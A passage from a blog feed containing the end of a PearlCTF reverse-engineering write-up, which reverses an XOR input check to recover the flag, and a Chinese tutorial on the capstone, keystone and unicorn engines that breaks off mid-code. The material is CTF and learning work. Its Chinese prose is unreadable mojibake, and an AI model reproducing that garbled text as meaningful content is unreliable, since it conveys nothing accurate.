I._.I\n</span><br><span class="line">          I._.I\n                      I._.I\n                      I._.I\n                      I._.I\n                      I._.I\n                      I._.I\n                      I.,.I\n</span><br><span class="line">   / /#\\ \\\n                   .dH# # #Hb.\n               _.~d#XXP I 7XX#b~,_\n            _.dXV^XP^ Y X Y ^7X^VXb._\n           /AP^   \\PY   Y   Y7/   ^VA\\\n          /8/      \\PP  I  77/      \\8\\\n         /J/        IV     VI        \\L\\\n         L|         |  \\ /  |         |J\n         V          |  | |  |          V\n                    |  | |  |\n                    |  | |  |\n</span><br><span class="line">|  | |  |\n                    |  | |  |\n _                  |  | |  |                  _\n( \\                 |  | |  |                 / )\n \\ \\                |  | |  |                / /\n(&#x27;\\ \\               |  | |  |               / /`)\n \\ \\ \\              |  | |  |              / / /\n(&#x27;\\ \\ \\             |  | |  |             / / /`)\n \\ \\ \\ )            |  | |  |            ( / / /\n(&#x27;\\ \\( )            |  | |  |            ( )/ /`)\n \\ \\ ( |            |  | |  |            | ) / /\n  \\ \\( |            |  | |  |            | )/ /\n   \\ ( |            |  | |  |            | ) /\n    \\( |            |   Y   |            | )/\n     | |            |   |   |            | |\n     J | ___...~~--&#x27;|   |   |`--~~...___ | L\n     &gt;-+&lt;...___     |   |   |     ___...&gt;+-&lt;\n    /     __   `--~.L___L___J.~--&#x27;   __     \\\n    K    /  ` --.     d===b     .-- &#x27;  \\    H\n    \\_._/        \\   // I \\   /        \\_._/\n      `--~.._     \\__\\ I //__/     _..~--&#x27;\n             `--~~..____ ____..~~--&#x27;\n</span><br><span class="line">     |   T   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    |   |   |\n                    I   &#x27;   I\n                     \\     /\n                      \\   /\n                       \\ /\n                       &quot;</span><br><span class="line"></span><br><span class="line">    sword = sword.split(&quot;\n&quot;)</span><br><span class="line">    for line in sword:</span><br><span class="line">        print(line)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;There it is! The sword of Eldoria&quot;)</span><br><span class="line">    print(&quot;Break it&#x27;s shackles and show that you are the Thalor&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    chain = input(&quot;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">    best = [117, 84, 87, 108, 59, 85, 66, 71, 71, 30, 16]</span><br><span class="line">    mod = []</span><br><span class="line">    plier = 69</span><br><span class="line"></span><br><span class="line">    for i in range(len(chain)):</span><br><span class="line">        mod.append(ord(chain[i]) ^ plier)</span><br><span class="line">        plier = ord(chain[i])</span><br><span class="line"></span><br><span class="line">    if mod == best:</span><br><span class="line">        print(&quot;Oh! True Thalor, you have broken the shackles&quot;)</span><br><span class="line">        print(&quot;You are the chosen one&quot;)</span><br><span class="line">        print(&quot;I kneel before you&quot;)</span><br><span class="line">        print(&quot;Go on! Take the sword and fulfill your destiny&quot;)</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line">        time.sleep(2)</span><br><span class="line"></span><br><span class="line">        return chain</span><br><span class="line"></span><br><span class="line">    print(&quot;You are not worthy&quot;)</span><br><span class="line">    print(&quot;The fate has you in it&#x27;s grip&quot;)</span><br><span class="line">    print(&quot;You will be forgotten in the sands of time&quot;)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>â€‹    </p><p>The input is processed with some xor magic and we check if the result is identical with the values in <code>best</code>. This can be reversed easily:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mod = [117, 84, 87, 108, 59, 85, 66, 71, 71, 30, 16]</span><br><span class="line">plier = 69</span><br><span class="line"></span><br><span class="line">for i in mod:</span><br><span class="line">    print(chr(i^plier),end=&quot;&quot;)</span><br><span class="line">    plier = i ^ plier</span><br></pre></td></tr></table></figure><p>Running this, gives us the last part of the flag <code>0d3_d1s4sm&#125;</code>. The full handcrafted decompile can be found <a href="https://github.com/D13David/ctf-writeups/blob/main/pearlctf24/rev/byteme/byteme.py"><code>here</code></a>.</p><p>Flag <code>pearl&#123;e4sy_p34sy_byt3c0d3_d1s4sm&#125;</code></p><h3 id="not-so-easy"><a href="#not-so-easy" class="headerlink" title="not_so_easy"></a>not_so_easy</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PearlCTF&quot;&gt;&lt;a href=&quot;#PearlCTF&quot; class=&quot;headerlink&quot; title=&quot;PearlCTF&quot;&gt;&lt;/a&gt;PearlCTF&lt;/h1&gt;&lt;h2 id=&quot;Rev&quot;&gt;&lt;a href=&quot;#Rev&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>capstoneã€keystoneä¸unicorn-1</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/01/capstone%E3%80%81keystone%E4%B8%8Eunicorn-1/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/01/capstone%E3%80%81keystone%E4%B8%8Eunicorn-1/</id>
    <published>2024-02-29T16:00:00.000Z</published>
    <updated>2024-09-16T07:11:40.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="capstoneã€keystoneä¸unicorn-1"><a href="#capstoneã€keystoneä¸unicorn-1" class="headerlink" title="capstoneã€keystoneä¸unicorn-1"></a>capstoneã€keystoneä¸unicorn-1</h1><h2 id="capstone"><a href="#capstone" class="headerlink" title="capstone"></a><strong>capstone</strong></h2><p>åŠ å¡å—æ´‹ç†å·¥å¤§å­¦å›¢é˜Ÿåœ¨ Blackhat USA 2014 ä¸Šå‘å¸ƒçš„ä¸€ä¸ªåæ±‡ç¼–å¼•æ“ã€‚</p><p>å®‰è£…ï¼š pip install capstone</p><h3 id="åŸºç¡€ç¤ºä¾‹"><a href="#åŸºç¡€ç¤ºä¾‹" class="headerlink" title="åŸºç¡€ç¤ºä¾‹"></a><strong>åŸºç¡€ç¤ºä¾‹</strong></h3><p>capstone çš„ API ä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œå› æ­¤ä½¿ç”¨è¯¥æ¡†æ¶ç¼–å†™å·¥å…·éå¸¸å®¹æ˜“ã€‚ ä¸‹é¢çš„ä»£ç åæ±‡ç¼–ä¸€äº› x86æœºå™¨ç ï¼Œå¹¶æ‰“å°å‡ºæ±‡ç¼–è¯­å¥ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br><span class="line"><span class="comment">#0x1000:pushrbp</span></span><br><span class="line"><span class="comment">#0x1001:movrax, qword ptr [rip + 0x13b8]</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> insn <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(insn.address, insn.mnemonic, insn.op_str))</span><br><span class="line">   </span><br><span class="line"><span class="comment">#0x1000:pushrbp</span></span><br><span class="line"><span class="comment">#0x1001:movrax, qword ptr [rip + 0x13b8]</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯æ¯ä¸€è¡Œä»£ç çš„è§£é‡Šï¼š</p><p>ç¬¬ 1 è¡Œï¼šå¯¼å…¥ Python æ¨¡å— capstoneã€‚</p><p>ç¬¬ 3 è¡Œï¼šè¦åæ±‡ç¼–çš„åŸå§‹äºŒè¿›åˆ¶ä»£ç ã€‚</p><p>ç¬¬ 5 è¡Œï¼šä½¿ç”¨ç±» Cs ä¸º capstone åˆå§‹åŒ– Python ç±»ã€‚ éœ€è¦ç»™è¿™ä¸ªç±»ä¸¤ä¸ªå‚æ•°ï¼šç¡¬ä»¶æ¶æ„å’Œç¡¬ä»¶æ¨¡å¼ã€‚</p><p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬è¦åæ±‡ç¼– x86 ä½“ç³»ç»“æ„çš„ 64 ä½ä»£ç ã€‚</p><p>ç¬¬ 6 è¡Œï¼šä½¿ç”¨ä¸Šé¢åˆ›å»ºçš„ Cs ç±»å®ä¾‹çš„æ–¹æ³• disasm() åæ±‡ç¼–äºŒè¿›åˆ¶ä»£ç ã€‚ disasm çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç¬¬ä¸€</p><p>æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º 0x1000ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œdisasm åæ±‡ç¼–æ‰€æœ‰ä»£ç ï¼Œç›´åˆ°æ²¡æœ‰æ›´å¤šä»£ç æˆ–é‡</p><p>åˆ°ä¸å¯è§£é‡Šçš„æŒ‡ä»¤ã€‚ disasm è¿”å›ä¸€ä¸ªç±»å‹ä¸º CsInsn çš„æŒ‡ä»¤åˆ—è¡¨ï¼Œè¿™é‡Œçš„ for å¾ªç¯ä¼šè¿­ä»£è¿™ä¸ªåˆ—è¡¨ã€‚</p><p>ç¬¬ 7 è¡Œï¼šæ‰“å°å‡ºæ¯æ¡æŒ‡ä»¤çš„ä¸€äº›å†…éƒ¨ä¿¡æ¯ã€‚ CsInsn ç±»å…¬å¼€äº†åæ±‡ç¼–æŒ‡ä»¤çš„æ‰€æœ‰å†…éƒ¨ä¿¡æ¯ã€‚ ä¸‹é¢ä»‹ç»äº†</p><p>æ­¤ç±»ä¸­ä¸€äº›æœ€å¸¸ç”¨çš„å±æ€§ã€‚</p><p>&#x2F;&#x2F;&#x2F;æƒ³èµ·æ¥äº†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># ä»æ–‡ä»¶ä¸­è¯»å–åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        hex_string = f.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—</span></span><br><span class="line">    bytes_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†å­—èŠ‚åºåˆ—å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;11.txt&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;output&quot;</span>  <span class="comment"># è¾“å‡ºæ–‡ä»¶ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› ä¸ºåå…­è¿›åˆ¶æ˜¯å­—èŠ‚æ•°æ®</span></span><br><span class="line"></span><br><span class="line">hex_to_file(input_file, output_file)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229202523536.png" alt="image-20240229202523536"></p><h3 id="æ›´é«˜æ•ˆçš„-API"><a href="#æ›´é«˜æ•ˆçš„-API" class="headerlink" title="æ›´é«˜æ•ˆçš„ API"></a><strong>æ›´é«˜æ•ˆçš„</strong> <strong>API</strong></h3><p>ä¸Šä¸ªç¤ºä¾‹ä¸­ä½¿ç”¨ disasm() æ–¹æ³•è·å– CsInsn å¯¹è±¡ã€‚è¿™æä¾›äº†å¯ç”¨äºåæ±‡ç¼–æŒ‡ä»¤çš„å®Œæ•´ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åªéœ€è¦åœ°å€ã€å¤§å°ã€åŠ©è®°ç¬¦å’Œ op_str ç­‰åŸºæœ¬æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ›´è½»é‡çº§çš„ API disasm_lite ã€‚</p><p>ä¸‹é¢æ˜¯ disasm_lite ç¤ºä¾‹</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> address, size, mnemonic, op_str <span class="keyword">in</span> md.disasm_lite(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(address, mnemonic, op_str))</span><br></pre></td></tr></table></figure><h3 id="æ¶æ„å’Œæ¨¡å¼"><a href="#æ¶æ„å’Œæ¨¡å¼" class="headerlink" title="æ¶æ„å’Œæ¨¡å¼"></a><strong>æ¶æ„å’Œæ¨¡å¼</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229204045467.png" alt="image-20240229204045467"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229204054519.png" alt="image-20240229204054519"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x56\x34\x21\x34\xc2\x17\x01\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_MIPS, CS_MODE_MIPS64 + CS_MODE_LITTLE_ENDIAN)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure><h2 id="keystone"><a href="#keystone" class="headerlink" title="keystone"></a><strong>keystone</strong></h2><p>pip install keystone-engine</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">&quot;mov eax, 3 \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;sub edx, eax \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;jmp edx&quot;</span></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">encoding, count = ks.asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s (number of statements: %u)&quot;</span> %(encoding, count))</span><br></pre></td></tr></table></figure><p>æ¯è¡Œä»£ç çš„æ³¨é‡Šï¼š</p><p>ç¬¬ 1 è¡Œï¼šåœ¨ä½¿ç”¨ä¹‹å‰å¯¼å…¥ keystone æ¨¡å—ã€‚</p><p>ç¬¬ 3-5 è¡Œï¼šè¦ç¼–è¯‘çš„æ±‡ç¼–å­—ç¬¦ä¸²ã€‚ æ­¤ç¤ºä¾‹ä¸­çš„ä»£ç æ˜¯ x86 32 ä½ï¼Œé‡‡ç”¨ Intel æ ¼å¼ã€‚ å¯ä»¥ç”¨ ; æˆ–</p><p>\n åˆ†éš”æ­¤å­—ç¬¦ä¸²ä¸­çš„æ±‡ç¼–æŒ‡ä»¤ã€‚</p><p>ç¬¬ 7 è¡Œï¼šä½¿ç”¨ç±» <strong>Ks</strong> åˆå§‹åŒ– keystoneã€‚ è¿™ä¸ªç±»æ¥å— 2 ä¸ªå‚æ•°ï¼šç¡¬ä»¶æ¶æ„å’Œç¡¬ä»¶æ¨¡å¼ã€‚ æ­¤ç¤ºä¾‹å¤„ç†</p><p>x86 ä½“ç³»ç»“æ„çš„ 32 ä½ä»£ç ã€‚</p><p>ç¬¬ 8 è¡Œï¼šä½¿ç”¨æ–¹æ³• <strong>asm</strong> ç¼–è¯‘æ±‡ç¼–æŒ‡ä»¤ã€‚ è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªç¼–ç å­—èŠ‚åˆ—è¡¨ï¼Œä»¥åŠ keystone åœ¨ç¼–è¯‘è¿‡</p><p>ç¨‹ä¸­å¤„ç†çš„è¾“å…¥è¯­å¥çš„æ•°é‡ã€‚</p><p>ç¬¬ 9 è¡Œï¼šæ‰“å°å‡ºæŒ‡ä»¤ç¼–ç å’Œå¤„ç†çš„æ±‡ç¼–è¯­å¥æ•°ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œkeystone æ¥å—é‡‡ç”¨ Intel è¯­æ³•çš„ x86 æ±‡ç¼–ã€‚ å¦‚æœè¦å¤„ç† x86 AT&amp;T è¯­æ³•ï¼Œå¯ä»¥ç®€å•åœ°åˆ‡æ¢åˆ°è¯­æ³• AT&amp;Tï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">&quot;movl $3, %eax \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;sub %eax, %edx \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;jmp *%edx&quot;</span></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">ks.syntax = KS_OPT_SYNTAX_ATT <span class="comment"># æ·»åŠ æ­¤è¡Œ</span></span><br><span class="line">encoding, count = ks.asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s (number of statements: %u)&quot;</span> %(encoding, count))</span><br></pre></td></tr></table></figure><h3 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a><strong>unicorn</strong></h3><p>unicorn å¼•æ“çš„ç”¨å¤„ï¼š</p><ul><li><p>ä»æ¶æ„è½¯ä»¶ä¸­è°ƒç”¨ä¸€ä¸ªæœ‰è¶£çš„å‡½æ•°ï¼Œè€Œä¸ä¼šåˆ›å»ºæœ‰å®³çš„è¿›ç¨‹</p></li><li><p>è§£å†³ CTF èµ›é¢˜</p></li><li><p>æ¨¡ç³Šæµ‹è¯•</p></li><li><p>æ¨¡æ‹Ÿæ‰§è¡Œæ··æ·†ä»£ç </p></li></ul><h3 id="ä»»åŠ¡-1"><a href="#ä»»åŠ¡-1" class="headerlink" title="ä»»åŠ¡ 1"></a><strong>ä»»åŠ¡</strong> <strong>1</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å½“è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å®ƒè‡ªå·±ä¼šæ‰“å° flagï¼Œä½†é€Ÿåº¦éå¸¸æ…¢ï¼Œflag çš„æ¯ä¸ªä¸‹ä¸€ä¸ªå­—èŠ‚çš„è®¡ç®—é€Ÿåº¦è¶Šæ¥è¶Šæ…¢ã€‚è¿™æ„å‘³ç€æœ‰å¿…è¦ä¼˜åŒ–ç¨‹åºä»¥è·å¾— flag</span></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># è¿™æ˜¯ä¸€ä¸ªé€’å½’å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ unicorn æ¥å¯¹å…¶è¿›è¡Œä¼˜åŒ–ã€‚é¦–å…ˆå¯¼å…¥ unicorn æ¨¡å—å¹¶å®ä¾‹åŒ–ä¸€ä¸ª Uc å¯¹è±¡ï¼š</span></span><br><span class="line">mu = Uc(UC_ARCH_X86,UC_MODE_64)</span><br><span class="line"><span class="comment"># è¦ä½¿ç”¨ unicornï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨åˆå§‹åŒ–è™šæ‹Ÿå†…å­˜ã€‚ å¯¹äºè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéœ€è¦åœ¨æŸå¤„ç¼–å†™ä»£ç å¹¶åˆ†é…ä¸€ä¸ªå †æ ˆã€‚äºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºå€æ˜¯ 0x400000ã€‚ å‡è®¾å †æ ˆå°†ä»åœ°å€ 0x0 å¼€å§‹ï¼Œå¤§å°ä¸º 1024*1024ã€‚</span></span><br><span class="line"><span class="comment"># æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨ mem_map æ–¹æ³•æ¥æ˜ å°„ä¸€ç‰‡å†…å­˜ã€‚</span></span><br><span class="line">BASE = <span class="number">0x400000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"><span class="comment"># ç°åœ¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨åŸºåœ°å€åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±åƒåŠ è½½ç¨‹åºä¸€æ ·ï¼Œç„¶åå°† RSP è®¾ç½®ä¸ºæŒ‡å‘å †æ ˆçš„æœ«å°¾</span></span><br><span class="line">mu.mem_write(BASE, <span class="built_in">open</span>(<span class="string">&quot;./fibonacci&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - <span class="number">8</span>)</span><br><span class="line"><span class="comment"># æ¥æ·»åŠ ä¸€ä¸ª hook ç›‘å¬æ¨¡æ‹Ÿè¿‡ç¨‹ï¼Œçœ‹çœ‹æ˜¯å“ªä¸ªè¯­å¥äº§ç”Ÿäº†å†…å­˜è®¿é—®é”™è¯¯ï¼š</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> cs.disasm(mu.mem_read(address, size), <span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(address), ins.mnemonic, ins.op_str)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"><span class="comment"># æˆ‘ä»¬å¯ä»¥å¯åŠ¨ä»¿çœŸå¹¶è¿è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œä½†éœ€è¦çŸ¥é“èµ·å§‹åœ°å€æ˜¯ä»€ä¹ˆä»¥åŠä»¿çœŸå™¨åº”è¯¥åœ¨å“ªé‡Œåœæ­¢ã€‚è€ƒè™‘ä»åœ°å€ 0x4004E0 å¼€å§‹æ¨¡æ‹Ÿä»£ç ï¼ˆmain å‡½æ•°é¦–åœ°å€ï¼‰ï¼Œç»“å°¾å¯ä»¥æ˜¯ 0x400575ï¼š</span></span><br><span class="line">mu.emu_start(<span class="number">0x4004E0</span>, <span class="number">0x400575</span>)</span><br><span class="line"><span class="comment"># è¿è¡Œå´äº§ç”Ÿäº†æŠ¥é”™ï¼š</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;Traceback (most recent call last):</span></span><br><span class="line"><span class="string">File &quot;solve.py&quot;, line 15, in &lt;module&gt;</span></span><br><span class="line"><span class="string">mu.emu_start(0x4004E0, 0x400575)</span></span><br><span class="line"><span class="string">File &quot;python38\lib\site-packages\unicorn\unicorn.py&quot;, line 547, in emu_start</span></span><br><span class="line"><span class="string">raise UcError(status)</span></span><br><span class="line"><span class="string">unicorn.unicorn.UcError: Invalid memory read (UC_ERR_READ_UNMAPPED)&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;è¿™æ®µä»£ç æ·»åŠ äº†ä¸€ä¸ªé’©å­ã€‚æˆ‘ä»¬å®šä¹‰äº†è‡ªå·±çš„å‡½æ•° hook_codeï¼Œå®ƒåœ¨æ¯æ¡æŒ‡ä»¤çš„ä»¿çœŸä¹‹å‰è¢«è°ƒç”¨ã€‚å®ƒéœ€</span></span><br><span class="line"><span class="string">è¦ä»¥ä¸‹å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">Uc å®ä¾‹</span></span><br><span class="line"><span class="string">æŒ‡ä»¤åœ°å€</span></span><br><span class="line"><span class="string">æŒ‡ä»¤å¤§å°</span></span><br><span class="line"><span class="string">ç”¨æˆ·æ•°æ®ï¼ˆæˆ‘ä»¬å¯ä»¥åœ¨ hook_add() çš„å¯é€‰å‚æ•°ä¸­ä¼ é€’è¿™ä¸ªå€¼ï¼‰&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># æ·»åŠ çš„åœ¨é‡Œé¢äº†</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x4004e0 push rbp</span></span><br><span class="line"><span class="string">0x4004e1 push rbx</span></span><br><span class="line"><span class="string">0x4004e2 xor esi, esi</span></span><br><span class="line"><span class="string">0x4004e4 mov ebp, 0x4007e1</span></span><br><span class="line"><span class="string">0x4004e9 xor ebx, ebx</span></span><br><span class="line"><span class="string">0x4004eb sub rsp, 0x18</span></span><br><span class="line"><span class="string">0x4004ef mov rdi, qword ptr [rip + 0x200b42]</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229212524751.png" alt="image-20240229212524751"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line"><span class="keyword">if</span> address <span class="keyword">in</span> [<span class="number">0x4004EF</span>, <span class="number">0x4004F6</span>, <span class="number">0x400502</span>, <span class="number">0x40054F</span>, <span class="number">0x400560</span>]:</span><br><span class="line">mu.reg_write(UC_X86_REG_RIP, address + size)</span><br><span class="line"><span class="keyword">if</span> address == <span 